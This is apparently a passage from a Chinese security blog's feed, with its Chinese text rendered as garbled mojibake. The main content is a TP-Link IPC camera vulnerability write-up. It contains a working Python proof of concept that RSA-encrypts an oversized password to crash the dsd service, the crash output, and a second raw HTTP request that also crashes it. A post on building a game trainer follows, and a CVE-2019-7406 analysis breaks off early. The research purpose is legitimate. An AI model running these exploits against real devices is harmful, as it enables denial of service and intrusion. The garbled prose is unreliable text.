<p>ä¼ å…¥çš„å¯†æ–‡åº”è¯¥æ˜¯ BASE64 ç¼–ç çš„ï¼Œæ ¹æ® sscanf å‚æ•°åˆ¤æ–­æ˜æ–‡ä¸­åº”è¯¥ä»¥å†’å·ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå‰åŠéƒ¨åˆ†æ˜¯ passwordï¼ŒååŠéƒ¨åˆ†æ˜¯ nonce å€¼ã€‚</p>
<p>å¼„æ¸…æ¥šæ•°æ®çš„åŸºæœ¬æ ¼å¼ä¹‹åï¼Œå¯ä»¥å°è¯•æ„é€  payloadï¼Œä¸è¿‡é¦–å…ˆè¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ RSA çš„å…¬é’¥ä»å“ªé‡Œè·å–ã€‚</p>
<p>ç”±äºæˆ‘ä»¬åˆ†æçš„éƒ½æ˜¯ web ç«¯æ¥å£ï¼Œé¦–å…ˆè€ƒè™‘çš„å°±æ˜¯æ•°æ®æ˜¯å¦ç”±å‰ç«¯åŠ å¯†ï¼Œæˆ–è€…åœ¨æ­£å¼å‘é€æ­¤è¯·æ±‚ä¹‹å‰ï¼Œä¼šå‘é€å…¶ä»–è¯·æ±‚è·å– RSA å…¬é’¥ã€‚</p>
<p>æŠ“åŒ…åˆ†æä¹‹åå‘ç°ä½¿ç”¨çš„æ˜¯ç¬¬äºŒç§æ–¹æ³•ï¼Œåœ¨å‘é€æ­£å¼è¯·æ±‚ä¹‹å‰ï¼Œä¼šé¦–å…ˆå‘é€è¯·æ±‚è·å– RSA å…¬é’¥ï¼Œä½¿ç”¨çš„æ¥å£æ˜¯ user_managementï¼Œå‚æ•°ä¸º get_encrypt_infoã€‚</p>
<p>æ‰€ä»¥åˆ°è¿™é‡Œæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯é¦–å…ˆè¯·æ±‚æœåŠ¡å™¨è·å–ä¸€ä¸ª RSA å…¬é’¥ï¼Œç„¶åå¯¹æ„é€ çš„ payload è¿›è¡ŒåŠ å¯†æ“ä½œï¼Œä¹‹åå‘é€è¯·æ±‚ï¼ŒéªŒè¯æ˜¯å¦èƒ½å¤Ÿè§¦å‘æ¼æ´ã€‚</p>
<p>è®¾å¤‡çš„ web ç®¡ç†ç•Œé¢å­˜åœ¨æ—¥å¿—çª—å£ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/IPC43AN-4.png"
                     
                ></p>
<p>æ˜¯å¦è§¦å‘äº†æ¼æ´å¯ä»¥é€šè¿‡æ­¤çª—å£æŸ¥çœ‹ã€‚</p>
<p>ä¸‹é¢æ˜¯æˆ‘ç¼–å†™çš„ä¸€ä¸ªç®€å•çš„ pocï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Signature_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;*&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">stok = <span class="string">&quot;*&quot;</span>   <span class="comment"># set a valid stok value here!</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json; charset=UTF-8&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">key, p</span>):</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">    cipher_text = base64.b64encode(cipher.encrypt(p))</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_public_key</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/stok=&quot;</span> + stok + <span class="string">&quot;/ds&quot;</span></span><br><span class="line">    data = <span class="string">r&#x27;&#123;&quot;user_management&quot;:&#123;&quot;get_encrypt_info&quot;:&#123;&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;&#x27;</span></span><br><span class="line">    res = requests.post(url, headers=headers, data=data)</span><br><span class="line">    public_key = res.content[<span class="number">40</span>:-<span class="number">41</span>]</span><br><span class="line">    <span class="keyword">return</span> urllib.unquote(public_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_alive</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(res.status_code) == <span class="string">&quot;200&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/stok=&quot;</span> + stok + <span class="string">&quot;/ds&quot;</span></span><br><span class="line">    public_key = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span> + get_public_key(ip, port) + <span class="string">&quot;\n-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    password = rsa_encrypt(public_key, <span class="string">&quot;a&quot;</span> * (<span class="number">0x60</span>))</span><br><span class="line">    data = <span class="string">r&#x27;&#123;&quot;user_management&quot;:&#123;&quot;check_user_info&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&#x27;</span> + password +<span class="string">r&#x27;&quot;,&quot;encrypt_type&quot;:&quot;2&quot;&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;&#x27;</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=data, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Success!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Failed!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.content)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> is_alive(ip, port):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Target is alive!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target seems down!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    res = exploit(ip, port)</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºè¯·æ±‚ dsd æ–‡ä»¶éœ€è¦ç™»å½•æƒé™ï¼Œæ‰€ä»¥é¦–å…ˆè¦è·å–ä¸€ä¸ªåˆæ³•çš„ stok å€¼ï¼Œå¯é€šè¿‡æŠ“åŒ…è·å–ã€‚ä¹‹åè®¾ç½®å¥½ ip å‚æ•°æ‰§è¡Œç¨‹åºå³å¯çœ‹åˆ°æ•ˆæœã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">âœ  Desktop python TP-LinkIPC.py </span><br><span class="line">[+] Target is alive!</span><br><span class="line">[*] Success!</span><br><span class="line">(&#x27;Connection aborted.&#x27;, BadStatusLine(&#x27;0\r\n&#x27;,))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/IPC43AN-4-1.png"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ° dsd ç¨‹åºå´©æºƒï¼Œå®ˆæŠ¤è¿›ç¨‹é‡ç½®äº† dsdï¼Œå¤šæ¬¡å‘é€æ•°æ®çœ‹åˆ° dsd å¤šæ¬¡å´©æºƒã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/IPC43AN-4-2.png"
                     
                ></p>
<p>ä½†æ˜¯è¿›ä¸€æ­¥åˆ©ç”¨ä¼šé‡åˆ°å›°éš¾ï¼Œç”±äºæ²¡æœ‰åˆé€‚çš„è°ƒè¯•ç¯å¢ƒï¼Œæ— æ³•ç¡®å®šæº¢å‡ºåˆ°ä»€ä¹ˆä½ç½®ï¼Œå¦å¤–è®¾å¤‡å¯èƒ½å¼€å¯äº† ASLRï¼Œå¯¼è‡´ç›²æµ‹éš¾åº¦å¾ˆé«˜ã€‚</p>
<p>å¦å¤–åœ¨æµ‹è¯•æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°äº†å¦å¤–ä¸€ä¸ªèƒ½å¤Ÿä½¿ dsd ç¨‹åºå´©æºƒçš„ POCï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /stok=*/ds HTTP/1.1</span><br><span class="line">Host: 192.168.3.20</span><br><span class="line">Content-Length: 326</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.3.20</span><br><span class="line">Referer: http://192.168.3.20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">&#123;&quot;system&quot;:&#123;&quot;config_recovery&quot;:&#123;&quot;config_name&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;pt1_x&quot;:&quot;1657&quot;,&quot;pt1_y&quot;:&quot;4382&quot;,&quot;pt2_x&quot;:&quot;9253&quot;,&quot;pt2_y&quot;:&quot;4413&quot;,&quot;direction&quot;:&quot;AtoB&quot;,&quot;sensitivity&quot;:&quot;50&quot;,&quot;people_enabled&quot;:&quot;off&quot;&#125;,&#123;&quot;id&quot;:&quot;2&quot;,&quot;pt1_x&quot;:&quot;1206&quot;,&quot;pt1_y&quot;:&quot;1574&quot;,&quot;pt2_x&quot;:&quot;9392&quot;,&quot;pt2_y&quot;:&quot;1327&quot;,&quot;direction&quot;:&quot;BtoA&quot;,&quot;sensitivity&quot;:&quot;50&quot;,&quot;people_enabled&quot;:&quot;off&quot;&#125;]&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;</span><br></pre></td></tr></table></figure></div>





























]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>ç®€å•çš„æ¸¸æˆä¿®æ”¹å™¨å®ç°2</title>
    <url>/2020/03/03/game_trainer2/</url>
    <content><![CDATA[<p>ä¸Šæ¬¡ç®€å•å®ç°äº†ä¸€ä¸ªä¿®æ”¹å™¨ï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œåªèƒ½ä¿®æ”¹äººç‰©çš„è¡€é‡ï¼Œå®é™…ä¸Šæƒ³è¦å†™å‡ºåŠŸèƒ½å¼ºå¤§çš„ä¿®æ”¹å™¨ï¼Œéœ€è¦å¯¹æ¸¸æˆè¿›ç¨‹ä¸€å®šç¨‹åº¦çš„é€†å‘åˆ†æï¼Œä»¥ä¾¿äºå®šä½å…³é”®é€»è¾‘å’Œç›¸å…³æ•°æ®ç»“æ„ã€‚</p>
<span id="more"></span>

<h2 id="ä»å†…å­˜æ•°æ®å…¥æ‰‹"><a href="#ä»å†…å­˜æ•°æ®å…¥æ‰‹" class="headerlink" title="ä»å†…å­˜æ•°æ®å…¥æ‰‹"></a>ä»å†…å­˜æ•°æ®å…¥æ‰‹</h2><p>ä¾æ—§ä»¥æŒºè¿›åœ°ç‰¢è¿™æ¬¾æ¸¸æˆä¸ºä¾‹ï¼Œä¸Šæ¬¡æˆ‘ä»¬åˆ©ç”¨ CE æ‰¾åˆ°äº†ä¸€äº›é™æ€æŒ‡é’ˆï¼Œè€ƒè™‘åˆ°æ¸¸æˆå¼€å‘çš„å†…å®¹ï¼Œè§’è‰²çš„è¡€é‡ç­‰æ•°æ®è‚¯å®šè¢«ä¿å­˜åœ¨æŸä¸ªå¯¹è±¡ä¸­ï¼Œæ—¢ç„¶æ‰¾åˆ°äº†è¡€é‡ï¼Œè¡€é‡é™„è¿‘ä¸€å®šå­˜åœ¨å¦å¤–ä¸€äº›å’Œè§’è‰²ç›¸å…³çš„æ•°æ®ã€‚</p>
<p>é¦–å…ˆæ‰¾åˆ°è¡€é‡æ‰€åœ¨çš„åœ°å€ï¼Œå°†å®ƒæ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œç„¶åå³é”®é€‰æ‹© Browse this memory region é€‰é¡¹ï¼Œå¼¹å‡ºä¸€ä¸ªçª—å£ï¼Œé€‰æ‹© Tool é€‰é¡¹å¡ä¸­çš„ Dissect data&#x2F;structuresï¼Œå¼¹å‡ºå¦å¤–ä¸€ä¸ªçª—å£ï¼Œé€‰æ‹© Structures é€‰é¡¹å¡ä¸­çš„ Define new structureï¼Œé»˜è®¤é€‰é¡¹ ok å³å¯ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer2-1.png"
                     
                ></p>
<p>çª—å£ä¸­ä¼šå‡ºç°å¾ˆå¤šæ•°æ®ï¼Œç¬¬ä¸€é¡¹æ˜¯è¡€é‡ï¼Œå…¶ä½™æ•°æ®æš‚æ—¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆã€‚ä¿æŒè¿™ä¸ªçª—å£ä¸è¦å…³é—­ï¼Œå›åˆ°æ¸¸æˆæ“ä½œäººç‰©ï¼Œå½“è¿›è¡ŒæŸäº›ç‰¹å®šæ“ä½œçš„æ—¶å€™ï¼Œåˆ—è¡¨ä¸­çš„æ•°æ®ä¼šå‘ç”Ÿå˜åŠ¨ï¼Œä¾‹å¦‚å½“æ‹¾å–äº†ä¸€ä¸ªæŠ¤ç”²ï¼Œæœ‰æ•°æ®ä¼šå¢åŠ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆç†çš„çŒœæµ‹è¿™ä¸ªæ•°æ®ä»£è¡¨äº†æŠ¤ç”²çš„æ•°é‡ï¼Œä¾ç…§æ­¤æ€è·¯é€ä¸ªæœç´¢å…¶ä»–æ•°æ®ï¼Œä¾‹å¦‚å­å¼¹æ•°é‡ã€é‡‘å¸æ•°é‡ç­‰ç­‰ï¼Œåœ¨è¿™äº›æ•°æ®é™„è¿‘ä¼šå‘ç°æ›´å¤šéšç€æ“ä½œå˜åŠ¨çš„å†…å®¹ã€‚</p>
<p>æŸäº›æ•°æ®æ˜¯å¯ä»¥çŒœæµ‹å‡ºæ¥çš„ï¼Œä½†æ˜¯æ›´å¤šçš„æ•°æ®çœ‹ä¼¼åœ¨éšæœºå˜åŠ¨ï¼Œå¹¶ä¸”æ‰‹åŠ¨ä¿®æ”¹ä¹Ÿçœ‹ä¸å‡ºæ¥æœ‰ä»€ä¹ˆå½±å“ï¼Œæ­¤æ—¶å°±éœ€è¦å¯¹æ¸¸æˆè¿›ç¨‹ä¸€å®šç¨‹åº¦çš„é€†å‘åˆ†æï¼Œå°è¯•ä»ä»£ç ä¸­æ¢³ç†æ¸¸æˆçš„é€»è¾‘ã€‚</p>
<h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>ä¸åŒæ¸¸æˆé€†å‘åˆ†æçš„è¿‡ç¨‹æ˜¯ä¸åŒçš„ï¼Œå› ä¸ºæ¸¸æˆé‡‡ç”¨äº†ä¸ä¸€æ ·çš„å¼•æ“ï¼Œä¾‹å¦‚æŒºè¿›åœ°ç‰¢ä½¿ç”¨çš„æ˜¯ Unity3D å¼•æ“å¼€å‘ï¼Œæ„å‘³ç€æ¸¸æˆä½¿ç”¨ C# ç¼–å†™ï¼Œè€Œå…¶å®ƒå¼•æ“ç­‰å¯èƒ½ä½¿ç”¨çš„æ˜¯ C++ ç¼–å†™ï¼Œä¸åŒè¯­è¨€å¼€å‘çš„æ¸¸æˆåœ¨é€†å‘ä¸Šæœ‰ä¸€å®šçš„å·®åˆ«ï¼Œä½†æ˜¯æ€è·¯å¤§ä½“ç›¸åŒã€‚</p>
<p>C# é€†å‘ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œæ¸¸æˆçš„ä¸»ä½“æ˜¯ Assembly-CSharp.dllï¼Œåœ¨æ²¡æœ‰æ··æ·†ä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ ILSpyã€dnspy ç­‰å·¥å…·å¯è½»æ˜“çš„åç¼–è¯‘æ­¤æ–‡ä»¶ã€‚</p>
<p>æ‰“å¼€æ–‡ä»¶åçœ‹åˆ°å…¶ä¸­å®šä¹‰äº†å¾ˆå¤šç±»ï¼Œè€ƒè™‘åˆ°è¡€é‡æ•°æ®ï¼Œæˆ‘ä»¬é¦–å…ˆå¯»æ‰¾å’Œå•è¯ Health æœ‰å…³çš„ç±»ã€‚</p>
<p>å’Œ Health ç›¸å…³çš„ç±»è¾ƒå°‘ï¼Œç®€å•åˆ†æä¸€ä¸‹å¯ä»¥å‘ç°ç±» HealthHaver å¾ˆå¯ç–‘ï¼ŒdnSpy ç­‰å·¥å…·åŒ…å«â€œåˆ†æâ€åŠŸèƒ½ï¼Œé€šè¿‡åˆ†æï¼Œå‘ç°è¿™ä¸ªç±»è¢«å¾ˆå¤šç±»æ‰€å¼•ç”¨ï¼Œå¹¶ä¸”å¼•ç”¨æ­¤ç±»çš„ç±»éƒ½å’Œæ¸¸æˆè§’è‰²(è¿›ä¸€æ­¥è®²ï¼Œæ˜¯å…·æœ‰è¡€é‡çš„è§’è‰²)æœ‰å…³ï¼Œä¾‹å¦‚ AIActorã€Player ç­‰ã€‚æŸ¥çœ‹æ­¤ç±»çš„æˆå‘˜å‘ç°å­˜åœ¨ currentHealthã€currentArmor ç­‰ã€‚</p>
<p>å•ä»é€†å‘ç»“æœä¸Šçœ‹å¹¶ä¸èƒ½ç¡®å®šè¿™ä¸ªç±»å°±å’Œè§’è‰²è¡€é‡æœ‰å…³ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç»“åˆ CE ä¿®æ”¹æ¥ç¡®å®šã€‚é¦–å…ˆåœ¨ dnSpy  ä¸­ç‚¹å‡»æˆå‘˜å˜é‡çš„ Token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer2-2.png"
                     
                ></p>
<p>å·¦ä¾§ä¼šæ˜¾ç¤ºå‡ºå˜é‡çš„æ­£ç¡®å®šä¹‰é¡ºåº(é»˜è®¤æƒ…å†µæ˜¯å­—æ¯æ’åº)ï¼Œå¯ä»¥å‘ç°åœ¨ currentHealth ä¸‹æ–¹å°±æ˜¯ currentArmor ï¼Œå¹¶ä¸”è¿˜æœ‰ maximumHealth ç­‰</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer2-3.png"
                     
                ></p>
<p>åœ¨ CE çš„ç»“æ„ä½“åˆ—è¡¨ä¸­æˆ‘ä»¬èƒ½å¤Ÿå®šä½çš„æ˜¯ CurrentHealthï¼Œé‚£ä¹ˆå°è¯•ä¿®æ”¹å’Œå®ƒç›¸é‚»çš„ä¸¤ä¸ªæˆå‘˜å‘¢ï¼Ÿ</p>
<p>ä¿®æ”¹ä¹‹åè¿”å›æ¸¸æˆæŸ¥çœ‹ï¼Œè§’è‰²çš„æœ€å¤§ç”Ÿå‘½å€¼å’ŒæŠ¤ç”²å°†å‘ç”Ÿå˜åŒ–ã€‚è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸå®šä½åˆ°äº†å’Œè¡€ä¸Šé™ã€æŠ¤ç”²ç›¸å…³çš„æ•°æ®ã€‚</p>
<p>è¿™ä¸ªæ¸¸æˆä¸­æœ‰å¾ˆå¤šæ­¦å™¨ï¼ŒæŒ‰ç…§å¼€å‘çš„æ€è·¯æ¥çœ‹ï¼Œä¸åŒçš„æ­¦å™¨åº”è¯¥ä¼šç»§æ‰¿äºåŒä¸€ä¸ªç±»ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨ä¸€ä¸ªç±»æ¥è¡¨ç¤ºï¼Œæ­¦å™¨æ‹¥æœ‰å­å¼¹æ•°é‡ï¼Œè¿™ä¸ªæ•°é‡è‚¯å®šé€šè¿‡ç±»ä¸­çš„æŸä¸ªæˆå‘˜è¡¨ç¤ºã€‚é‚£ä¹ˆå’Œä¿®æ”¹è¡€é‡ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢å½“å‰å­å¼¹æ•°é‡æ¥å®šä½åˆ°æªæ¢°çš„ç»“æ„ä½“ï¼Œåœ¨ dnSpy ä¸­åˆšå¥½å‘ç°äº†ä¸€ä¸ªç±»å«åš Gunï¼Œé‡Œé¢åŒ…å«å­å¼¹æ•°é‡ã€æ­¦å™¨åå­—ç­‰ç­‰æ•°æ®ã€‚</p>
<p>å’Œä¿®æ”¹è¡€é‡çš„æ€è·¯ä¸€æ ·ï¼Œåœ¨ dnSpy ä¸­æ‰¾åˆ°æ•°æ®çš„ä½ç½®ï¼Œåœ¨ CE ä¸­å°è¯•ä¿®æ”¹å³å¯é€æ­¥ç†æ¸…å„ä¸ªæ•°æ®çš„ä½œç”¨ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå½“ä¿®æ”¹å®Œæ­¦å™¨çš„æ•°æ®ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬æ‹¾å–äº†æ–°çš„æ­¦å™¨ï¼Œåˆšåˆšä¿®æ”¹çš„æ•ˆæœå¹¶ä¸ä¼šè½¬ç§»åˆ°æ–°çš„æ­¦å™¨ä¸Šé¢ï¼Œæ€è€ƒå…¶åŸå› ï¼Œä¿å­˜è§’è‰²ä¿¡æ¯çš„ç±»è‚¯å®šå­˜åœ¨æŸä¸ªæˆå‘˜ä¾‹å¦‚ currentGunï¼Œç”¨äºè¡¨ç¤ºå½“å‰è§’è‰²æ­£åœ¨ä½¿ç”¨çš„æ­¦å™¨å¯¹è±¡ï¼Œåˆ‡æ¢æ­¦å™¨ä¹‹åè¿™ä¸ªæˆå‘˜å†…å®¹ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ‰€ä»¥æƒ³è¦ç¨³å®šä¿®æ”¹æ‰€æœ‰æ­¦å™¨çš„æ•°æ®ï¼Œå°±è¦æ‰¾åˆ°ä¿å­˜è§’è‰²ä¿¡æ¯çš„æ•°æ®ã€‚</p>
<p>æŒ‰ç…§ä»¥ä¸Šæ€è·¯ï¼Œé€šè¿‡é€†å‘åˆ†ææ‰¾åˆ°è§’è‰²ä¿¡æ¯ç±»ï¼Œç„¶åé€šè¿‡ CE ä¿®æ”¹ç¡®å®šã€‚è¿™é‡Œä¸åœ¨èµ˜è¿°ï¼Œä¿å­˜è§’è‰²ä¿¡æ¯çš„ç±»å«åš PlayerControllerï¼Œé‡Œé¢çš„ inventory å­—æ®µè¡¨ç¤ºä¸€ä¸ª GunInventory å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ‹¥æœ‰ currentGun æˆå‘˜ï¼Œè¡¨ç¤ºå½“å‰è§’è‰²æ­£åœ¨ä½¿ç”¨çš„æ­¦å™¨å¯¹è±¡ã€‚</p>
<h2 id="ä»£ç å®ç°ä¿®æ”¹å™¨"><a href="#ä»£ç å®ç°ä¿®æ”¹å™¨" class="headerlink" title="ä»£ç å®ç°ä¿®æ”¹å™¨"></a>ä»£ç å®ç°ä¿®æ”¹å™¨</h2><p>åŸºäºä»¥ä¸Šæ€è·¯ï¼Œå¯¹ä¹‹å‰çš„ä¿®æ”¹å™¨è¿›è¡Œä¿®æ”¹ï¼Œæ·»åŠ äº†æ— é™å­å¼¹ï¼Œä¸€å‡»å¿…æ€ç­‰åŠŸèƒ½(å¯èƒ½æœ‰ BUG)ï¼Œä¿®æ”¹ç‰ˆæœ¬å·²ç»ä¸Šä¼ åˆ° Githubï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥çœ‹ä¸€ä¸‹ã€‚</p>
<p><a class="link"   href="https://github.com/rrrrrrri/MyEtGTrainer" >https://github.com/rrrrrrri/MyEtGTrainer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>GAME</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-7406</title>
    <url>/2020/02/29/CVE-2019-7406/</url>
    <content><![CDATA[<p>re365 æ˜¯ TP-Link æ——ä¸‹çš„ä¸€æ¬¾ WiFi ä¿¡å·æ‹“å±•å™¨ï¼ŒIBM å®‰å…¨ç ”ç©¶å‘˜åœ¨æ­¤è®¾å¤‡ä¸Šé¢å‘ç°äº†ä¸€ä¸ªä¸¥é‡çš„ RCE æ¼æ´ï¼Œä¸éœ€è¦èº«ä»½éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘è®¾å¤‡å‘é€ç•¸å½¢çš„ HTTP æ•°æ®åŒ…åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<span id="more"></span>

<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é¦–å…ˆå» TP-Link å®˜æ–¹ç½‘ç«™ä¸‹è½½å›ºä»¶ <a class="link"   href="https://www.tp-link.com/uk/support/download/re365/#Firmware" >https://www.tp-link.com/uk/support/download/re365/#Firmware<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>åº”è¯¥ä¸‹è½½ 2018-06-05 é‡Šå‡ºçš„å›ºä»¶ï¼Œæœ€æ–°ç‰ˆå›ºä»¶å·²ç»ä¿®å¤äº†æ­¤æ¼æ´ã€‚</p>
<p>ä¸‹è½½åè§£å‹å‡ºå›ºä»¶ï¼Œå¯ç›´æ¥ä½¿ç”¨ binwalk è§£å‹å›ºä»¶ã€‚é€šè¿‡æŸ¥çœ‹ init ä¿¡æ¯ï¼Œå‘ç°ç³»ç»Ÿå¯åŠ¨ä¹‹åä¼šè‡ªåŠ¨è¿è¡Œ &#x2F;usr&#x2F;bin&#x2F;httpd ç¨‹åºï¼Œè¿™ä¸ªç¨‹åºåº”è¯¥æ˜¯ç”¨äºå¤„ç† HTTP è¯·æ±‚çš„ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpd: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped</span><br></pre></td></tr></table></figure></div>

<p>MIPS å°ç«¯åºï¼Œç›´æ¥ä½¿ç”¨ Ghidra è¿›è¡Œåˆ†æã€‚</p>
